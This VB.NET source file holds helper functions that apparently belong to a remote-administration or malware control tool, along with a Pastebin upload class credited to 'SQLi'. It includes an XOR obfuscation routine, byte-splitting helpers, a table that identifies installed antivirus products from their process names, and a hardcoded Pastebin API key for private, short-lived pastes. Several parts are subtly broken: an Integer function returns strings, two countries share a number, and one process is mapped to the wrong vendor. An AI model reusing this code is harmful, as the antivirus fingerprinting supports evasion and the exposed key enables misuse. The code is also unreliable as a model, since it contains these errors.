Imports System.IO
Imports System.Net
Imports System.Text

Module Func
    ''' <summary>
    ''' XOR Function [Deprecated]
    ''' </summary>
    ''' <param name="str">String</param>
    ''' <param name="key">Key</param>
    ''' <returns></returns>
    Public Function Xord(ByVal str As String, ByVal key As String)
        Dim i As Short
        Xord = ""
        Dim KeyChar As Integer
        KeyChar = Asc(key)
        For i = 1 To Len(str)
            Xord &=
               Chr(KeyChar Xor
               Asc(Mid(str, i, 1)))
        Next
    End Function
    ''' <summary>
    ''' Convert size in bytes to conventional, readable format
    ''' </summary>
    ''' <param name="Size">Raw size</param>
    ''' <returns></returns>
    Public Function siz(ByVal Size As String) As String
        If Long.Parse(Size) > 1073741824 Then
            Dim sz As Double = Long.Parse(Size) / 1073741824
            Return Math.Round(sz, 1).ToString & " GB"
        ElseIf Long.Parse(Size) > 1048576 Then
            Dim sz As Double = Long.Parse(Size) / 1048576
            Return Math.Round(sz, 1).ToString & " MB"
        ElseIf Long.Parse(Size) > 1024 Then
            Dim sz As Double = Long.Parse(Size) / 1024
            Return Math.Round(sz, 1).ToString & " KB"
        Else
            Return Math.Round(Long.Parse(Size), 1).ToString & " B"
        End If
    End Function
    ''' <summary>
    ''' String to bytes
    ''' </summary>
    ''' <param name="s">String</param>
    ''' <returns></returns>
    Function SB(ByVal s As String) As Byte() ' string to byte()
        Return System.Text.Encoding.Default.GetBytes(s)
    End Function
    ''' <summary>
    ''' Bytes to string
    ''' </summary>
    ''' <param name="b">Bytes</param>
    ''' <returns></returns>
    Function BS(ByVal b As Byte()) As String ' byte() to string
        Return System.Text.Encoding.Default.GetString(b)
    End Function
    ''' <summary>
    ''' Split bytes by word
    ''' </summary>
    ''' <param name="b">Bytes</param>
    ''' <param name="WRD">Word</param>
    ''' <returns></returns>
    Function fx(ByVal b As Byte(), ByVal WRD As String) As Array
        Dim a As New List(Of Byte())
        Dim M As New IO.MemoryStream
        Dim MM As New IO.MemoryStream
        Dim T As String() = Split(BS(b), WRD)
        M.Write(b, 0, T(0).Length)
        MM.Write(b, T(0).Length + WRD.Length, b.Length - (T(0).Length + WRD.Length))
        a.Add(M.ToArray)
        a.Add(MM.ToArray)
        M.Dispose()
        MM.Dispose()
        Return a.ToArray
    End Function
    ''' <summary>
    ''' Get Antivirus software product name from process name
    ''' </summary>
    ''' <param name="pname">Process name</param>
    ''' <returns></returns>
    Public Function GetAV(ByVal pname As String) As String
        If pname = "ekrn" Then
            Return "NOD32"
        ElseIf pname = "avgcc" Then
            Return "AVG"
        ElseIf pname = "avgnt" Then
            Return "Avira"
        ElseIf pname = "ahnsd" Then
            Return "AhnLab-V3"
        ElseIf pname = "bdss" Then
            Return "BitDefender"
        ElseIf pname = "bdv" Then
            Return "ByteHero"
        ElseIf pname = "clamav" Then
            Return "ClamAV"
        ElseIf pname = "fpavserver" Then
            Return "F-Prot"
        ElseIf pname = "fssm32" Then
            Return "F-Secure"
        ElseIf pname = "avkcl" Then
            Return "GData"
        ElseIf pname = "engface" Then
            Return "Jiangmin"
        ElseIf pname = "avp" Then
            Return "Kaspersky"
        ElseIf pname = "updaterui" Then
            Return "McAfee"
        ElseIf pname = "msmpeng" Then
            Return "MSE/Defender"
        ElseIf pname = "zanda" Then
            Return "Norman"
        ElseIf pname = "npupdate" Then
            Return "nProtect"
        ElseIf pname = "inicio" Then
            Return "Panda"
        ElseIf pname = "sagui" Then
            Return "Prevx"
        ElseIf pname = "Norman" Then
            Return "Sophos"
        ElseIf pname = "savservice" Then
            Return "Sophos"
        ElseIf pname = "saswinlo" Then
            Return "SUPERAntiSpyware"
        ElseIf pname = "spbbcsvc" Then
            Return "Symantec"
        ElseIf pname = "thd32" Then
            Return "TheHacker"
        ElseIf pname = "ufseagnt" Then
            Return "TrendMicro"
        ElseIf pname = "dllhook" Then
            Return "VBA32"
        ElseIf pname = "sbamtray" Then
            Return "VIPRE"
        ElseIf pname = "vrmonsvc" Then
            Return "ViRobot"
        ElseIf pname = "vbcalrt" Then
            Return "VirusBuster"
        ElseIf pname = "mbam" Then
            Return "Malwarebytes Anti-Malware GUI"
        ElseIf pname = "mbamresearch" Then
            Return "Malwarebytes Anti-Malware"
        ElseIf pname = "mbamservice" Then
            Return "Malwarebytes Anti-Malware Service"
        Else
            Return ""
        End If
    End Function
    ''' <summary>
    ''' Get number for country
    ''' </summary>
    ''' <param name="queryCountry">Country name</param>
    ''' <returns></returns>
    Public Function GetCountryNumber(ByVal queryCountry As String) As Integer
        Select Case queryCountry
            Case UCase("Afghanistan")
                Return 1
            Case UCase("Albania")
                Return 2
            Case UCase("Algeria")
                Return 3
            Case UCase("American Samoa")
                Return 4
            Case UCase("Andorra")
                Return "ad"
            Case UCase("Angola")
                Return 6
            Case UCase("Anguilla")
                Return 7
            Case UCase("Antigua and Barbuda")
                Return 8
            Case UCase("Argentina")
                Return 9
            Case UCase("Armenia")
                Return 10
            Case UCase("Aruba")
                Return 11
            Case UCase("Australia")
                Return 12
            Case UCase("Austria")
                Return 13
            Case UCase("Azerbaijan")
                Return 14
            Case UCase("Bahamas")
                Return 15
            Case UCase("Bahrain")
                Return 16
            Case UCase("Bangladesh")
                Return 17
            Case UCase("Barbados")
                Return 18
            Case UCase("Belarus")
                Return 19
            Case UCase("Belgium")
                Return 20
            Case UCase("Belize")
                Return 21
            Case UCase("Benin")
                Return 22
            Case UCase("Bermuda")
                Return 23
            Case UCase("Bhutan")
                Return 24
            Case UCase("Bolivia")
                Return 25
            Case UCase("Bosnia & Herzegovina")
                Return 26
            Case UCase("Botswana")
                Return 27
            Case UCase("Bouvet Island")
                Return 28
            Case UCase("Brazil")
                Return 29
            Case UCase("British Indian Ocean Territory")
                Return 30
            Case UCase("British Virgin Islands")
                Return 31
            Case UCase("Brunei")
                Return 32
            Case UCase("Bulgaria")
                Return 33
            Case UCase("Burkina Faso")
                Return 34
            Case UCase("Burundi")
                Return 35
            Case UCase("Cambodia")
                Return 36
            Case UCase("Cameroon")
                Return 37
            Case UCase("Canada")
                Return 38
            Case UCase("Cape Verde")
                Return 39
            Case UCase("catalonia")
                Return 40
            Case UCase("Cayman Islands")
                Return 41
            Case UCase("Central African Republic")
                Return 42
            Case UCase("Chad")
                Return 43
            Case UCase("Chile")
                Return 44
            Case UCase("China")
                Return 45
            Case UCase("Christmas Islands")
                Return 46
            Case UCase("Cocos (Keeling) Islands")
                Return 47
            Case UCase("Colombia")
                Return 48
            Case UCase("Comoras")
                Return 49
            Case UCase("Congo, the Democratic Republic of the")
                Return 50
            Case UCase("Costa Rica")
                Return 51
            Case UCase("Croatia")
                Return 52
            Case UCase("Cuba")
                Return 53
            Case UCase("Cyprus")
                Return 54
            Case UCase("Czech Republic")
                Return 55
            Case UCase("Denmark")
                Return 56
            Case UCase("Djibouti")
                Return 57
            Case UCase("Dominica")
                Return 58
            Case UCase("Dominican Republic")
                Return 59
            Case UCase("Ecuador")
                Return 60
            Case UCase("Egypt")
                Return 61
            Case UCase("El Salvador")
                Return 62
            Case UCase("England")
                Return 63
            Case UCase("Equatorial Guinea")
                Return 64
            Case UCase("Eritrea")
                Return 65
            Case UCase("Estonia")
                Return 66
            Case UCase("Ethiopia")
                Return 67
            Case UCase("europeanunion")
                Return 68
            Case UCase("Falkland Islands (Malvinas)")
                Return 69
            Case UCase("Faroe Islands")
                Return 70
            Case UCase("Fiji")
                Return 71
            Case UCase("Finland")
                Return 72
            Case UCase("France")
                Return 73
            Case UCase("French Guiana")
                Return 74
            Case UCase("French Polynesia")
                Return 75
            Case UCase("French Southern Territories")
                Return 76
            Case UCase("Gabon")
                Return 77
            Case UCase("Gambia")
                Return 78
            Case UCase("Georgia")
                Return 79
            Case UCase("Germany")
                Return 80
            Case UCase("Ghana")
                Return 81
            Case UCase("Gibraltar")
                Return 82
            Case UCase("Greece")
                Return 83
            Case UCase("Greenland")
                Return 84
            Case UCase("Grenada")
                Return 85
            Case UCase("Guadeloupe")
                Return 86
            Case UCase("Guam")
                Return 87
            Case UCase("Guatemala")
                Return 88
            Case UCase("Guinea")
                Return 89
            Case UCase("Guinea-Bissau")
                Return 90
            Case UCase("Guyana")
                Return 91
            Case UCase("Haiti")
                Return 92
            Case UCase("Heard Island and McDonald Islands")
                Return 93
            Case UCase("Honduras")
                Return 94
            Case UCase("Hong Kong")
                Return 95
            Case UCase("Hungary")
                Return 96
            Case UCase("Iceland")
                Return 97
            Case UCase("India")
                Return 98
            Case UCase("Indonesia")
                Return 99
            Case UCase("Iran, Islamic Republic of")
                Return 100
            Case UCase("Iraq")
                Return 101
            Case UCase("Ireland")
                Return 102
            Case UCase("Israel")
                Return 103
            Case UCase("Italy")
                Return 104
            Case UCase("Jamaica")
                Return 105
            Case UCase("Japan")
                Return 106
            Case UCase("Jordan")
                Return 107
            Case UCase("Kazakhstan")
                Return 108
            Case UCase("Kenya")
                Return 109
            Case UCase("Kiribati")
                Return 110
            Case UCase("Korea, Democratic People's Republic of")
                Return 111
            Case UCase("Korea, Republic of")
                Return 112
            Case UCase("Kuwait")
                Return 113
            Case UCase("Kyrgyzstan")
                Return 114
            Case UCase("Laos")
                Return 115
            Case UCase("Latvia")
                Return 116
            Case UCase("Lebanon")
                Return 117
            Case UCase("Lesotho")
                Return 118
            Case UCase("Liberia")
                Return 119
            Case UCase("Libya")
                Return 120
            Case UCase("Liechtenstein")
                Return 121
            Case UCase("Lithuania")
                Return 122
            Case UCase("Luxembourg")
                Return 123
            Case UCase("Macao")
                Return 124
            Case UCase("Macedonia")
                Return 125
            Case UCase("Madagascar")
                Return 126
            Case UCase("Malawi")
                Return 127
            Case UCase("Malaysia")
                Return 128
            Case UCase("Maldives")
                Return 129
            Case UCase("Mali")
                Return 130
            Case UCase("Malta")
                Return 131
            Case UCase("Marshall Islands")
                Return 132
            Case UCase("Martinique")
                Return 133
            Case UCase("Mauritania")
                Return 134
            Case UCase("Mauritius")
                Return 135
            Case UCase("Mayotte")
                Return 136
            Case UCase("Mexico")
                Return 137
            Case UCase("Micronesia, Federated States of")
                Return 138
            Case UCase("Moldava")
                Return 139
            Case UCase("Monaco")
                Return 140
            Case UCase("Mongolia")
                Return 141
            Case UCase("Montenegro")
                Return 142
            Case UCase("Montserrat")
                Return 143
            Case UCase("Morocco")
                Return 144
            Case UCase("Mozambique")
                Return 145
            Case UCase("Myanmar")
                Return 146
            Case UCase("Namibia")
                Return 147
            Case UCase("Nauru")
                Return 148
            Case UCase("Nepal")
                Return 149
            Case UCase("Netherlands Antilles")
                Return 150
            Case UCase("Netherlands, The")
                Return 151
            Case UCase("New Caledonia")
                Return 152
            Case UCase("New Zealand")
                Return 153
            Case UCase("Nicaragua")
                Return 154
            Case UCase("Niger")
                Return 155
            Case UCase("Nigeria")
                Return 156
            Case UCase("Niue")
                Return 157
            Case UCase("Norfolk Island")
                Return 158
            Case UCase("Northern Mariana Islands")
                Return 159
            Case UCase("Norway")
                Return 160
            Case UCase("Oman")
                Return 161
            Case UCase("Pakistan")
                Return 162
            Case UCase("Palau")
                Return 163
            Case UCase("Panama")
                Return 164
            Case UCase("Papua New Guinea")
                Return 165
            Case UCase("Paraguay")
                Return 166
            Case UCase("Peru")
                Return 167
            Case UCase("Phillipines")
                Return 168
            Case UCase("Pitcairn Islands")
                Return 169
            Case UCase("Poland")
                Return 170
            Case UCase("Portugal")
                Return 171
            Case UCase("ps")
                Return 172
            Case UCase("Puerto Rico")
                Return 173
            Case UCase("Qatar")
                Return 174
            Case UCase("Reunion")
                Return 175
            Case UCase("Romania")
                Return 176
            Case UCase("rs")
                Return 177
            Case UCase("Russian Federation")
                Return 178
            Case UCase("Rwanda")
                Return 179
            Case UCase("Saint Helena")
                Return 180
            Case UCase("Saint Kitts and Nevis")
                Return 181
            Case UCase("Saint Lucia")
                Return 182
            Case UCase("Saint Pierre")
                Return 183
            Case UCase("Saint Vincent and the Grenadines")
                Return 184
            Case UCase("Samoa")
                Return 185
            Case UCase("San Marino")
                Return 186
            Case UCase("Sao Tome and Principe")
                Return 187
            Case UCase("Saudi Arabia")
                Return 188
            Case UCase("scotland")
                Return 189
            Case UCase("Senegal")
                Return 190
            Case UCase("Seychelles")
                Return 191
            Case UCase("Sierra Leone")
                Return 192
            Case UCase("Singapore")
                Return 193
            Case UCase("Slovakia")
                Return 194
            Case UCase("Slovenia")
                Return 195
            Case UCase("Solomon Islands")
                Return 196
            Case UCase("Somalia")
                Return 197
            Case UCase("South Africa")
                Return 198
            Case UCase("South Georgia and the South Sandwich Islands")
                Return 199
            Case UCase("Spain")
                Return 200
            Case UCase("Sri Lanka")
                Return 201
            Case UCase("Sudan")
                Return 202
            Case UCase("Suriname")
                Return 203
            Case UCase("Svalbard & Jan Mayen Islands")
                Return 204
            Case UCase("Swaziland")
                Return 205
            Case UCase("Sweden")
                Return 206
            Case UCase("Switzerland")
                Return 207
            Case UCase("Syrian Arab Republic")
                Return 208
            Case UCase("Taiwan")
                Return 209
            Case UCase("Tajikistan")
                Return 210
            Case UCase("Tanzania, United Republic of")
                Return 211
            Case UCase("Thailand")
                Return 212
            Case UCase("Togo")
                Return 213
            Case UCase("Tokelau")
                Return 214
            Case UCase("Tonga")
                Return 215
            Case UCase("Trinidad and Tobago")
                Return 216
            Case UCase("Tunisia")
                Return 217
            Case UCase("Turkey")
                Return 218
            Case UCase("Turkmenistan")
                Return 219
            Case UCase("Turks")
                Return 220
            Case UCase("Tuvalu")
                Return 221
            Case UCase("Uganda")
                Return 222
            Case UCase("Ukraine")
                Return 223
            Case UCase("United Arab Emirates")
                Return 224
            Case UCase("United Kingdom")
                Return 225
            Case UCase("United States Minor Outlying Islands")
                Return 226
            Case UCase("United States")
                Return 227
            Case UCase("Uruguay")
                Return 228
            Case UCase("Uzbekistan")
                Return 229
            Case UCase("Wales")
                Return 230
            Case UCase("Wallis and Futuna")
                Return 231
            Case UCase("Vanuatu")
                Return 232
            Case UCase("Vatican City State")
                Return 233
            Case UCase("Venezuela")
                Return 234
            Case UCase("Western Sahara")
                Return 235
            Case UCase("Viet Nam")
                Return 236
            Case UCase("Virgin Islands, U.S")
                Return 237
            Case UCase("Yemen")
                Return 238
            Case UCase("Zambia")
                Return 229
            Case UCase("Zimbabwe")
                Return 240
            Case Else
                Return "zz"
        End Select
    End Function

    ''Added in migration from WinForms to WPF
    Public Function OpenForms(ByVal openWindows As WindowCollection, ByVal windowTitle As String) As Window
        Return openWindows.OfType(Of Window).Where(Function(x) x.Name = windowTitle).First
    End Function

    Public Sub GroupU(ByVal listView As ListView, ByVal descriptionString As String)
        Dim view As CollectionView = DirectCast(CollectionViewSource.GetDefaultView(listView.ItemsSource), CollectionView)
        Dim groupDescription As New PropertyGroupDescription(descriptionString)
        If Not view.GroupDescriptions.Contains(groupDescription) Then
            view.GroupDescriptions.Add(groupDescription)
        End If
    End Sub

    ''End Added in migration from WinForms to WPF
End Module

' Written by SQLi
' http://gaming-and-security.blogspot.com/
Public Class Pastebin
    Public Function NewPaste(ByVal Content As String)
        Dim api_dev_key As String = "0cd7d52d4c25498c0d1dd8b0d498a8ed" '<-- Your API key here
        Dim api_paste_code As String = URLEncode(Content)
        Dim api_paste_private As String = "2"
        'Dim api_paste_name As String = URLEncode(Name)
        Dim api_paste_expire_date As String = "10M"
        Dim api_paste_format As String = "php"
        Dim api_user_key As String = ""
        Dim Response As String = HttpPost("http://pastebin.com/api/api_post.php", "api_option=paste&api_dev_key=" & api_dev_key & "&api_paste_code=" & api_paste_code)
        If Response.Contains("Bad API request") = False Then
            Return Raw(Response)
        Else
            Return "Error"
        End If
    End Function

    Private Function URLEncode(ByVal EncodeStr As String) As String
        Dim i As Integer
        Dim erg As String
        erg = EncodeStr
        erg = Replace(erg, "%", Chr(1))
        erg = Replace(erg, "+", Chr(2))
        For i = 0 To 255
            Select Case i
                Case 37, 43, 48 To 57, 65 To 90, 97 To 122
                Case 1
                    erg = Replace(erg, Chr(i), "%25")
                Case 2
                    erg = Replace(erg, Chr(i), "%2B")
                Case 32
                    erg = Replace(erg, Chr(i), "+")
                Case 3 To 15
                    erg = Replace(erg, Chr(i), "%0" & Hex(i))
                Case Else
                    erg = Replace(erg, Chr(i), "%" & Hex(i))
            End Select
        Next
        Return erg
    End Function

    Public Function Raw(ByVal URL As String)
        Dim ID As String = URL.Substring(URL.LastIndexOf("/") + 1)
        ID = "http://pastebin.com/raw.php?i=" & ID
        Return ID
    End Function

    Private Function HttpPost(ByVal URL As String, ByVal Data As String)
        Dim request As WebRequest = WebRequest.Create(URL)
        request.Method = "POST"
        Dim byteArray As Byte() = Encoding.UTF8.GetBytes(Data)
        request.ContentType = "application/x-www-form-urlencoded"
        request.ContentLength = byteArray.Length
        Dim dataStream As Stream = request.GetRequestStream()
        dataStream.Write(byteArray, 0, byteArray.Length)
        dataStream.Close()
        Dim response As WebResponse = request.GetResponse()
        'Console.WriteLine(CType(response, HttpWebResponse).StatusDescription)
        dataStream = response.GetResponseStream()
        Dim reader As New StreamReader(dataStream)
        Dim responseFromServer As String = reader.ReadToEnd()
        reader.Close()
        dataStream.Close()
        response.Close()
        Return responseFromServer
    End Function
End Class